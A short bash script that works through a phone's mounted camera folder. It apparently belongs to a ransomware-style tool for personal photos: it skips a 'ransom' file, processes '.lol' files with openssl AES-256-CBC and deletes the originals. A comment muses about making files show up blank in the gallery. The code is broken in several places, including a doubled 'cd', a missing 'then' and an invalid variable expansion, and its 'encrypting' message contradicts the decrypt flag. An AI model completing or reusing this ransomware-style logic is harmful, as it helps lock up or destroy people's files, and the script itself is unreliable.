#!/bin/bash

PHONEPATH=$(echo /run/user/$UID/gvfs/mtp*/*/DCIM/CameraDev)
LOCALPATH=$(pwd)




cd cd "$PHONEPATH"
currentfile=1
filecount=$(ls -1 | grep -v "ransom" | grep -v ".lol" | wc -l)
 
for f in *
do 
	
	if [[ $f = *".lol" ]];
		echo "encrypting $f ($currentfile/$filecount)..."
		openssl aes-256-cbc -d -a -in $f -out ${$f/%????/} #output the file and remove the .lol extension
		rm $f #TODO Consider leaving the filetype as JPG. This will make the file show up blank in the gallery and automate file removal, which is a nice feature
		currentfile=$((currentfile+1)) 
	fi

done
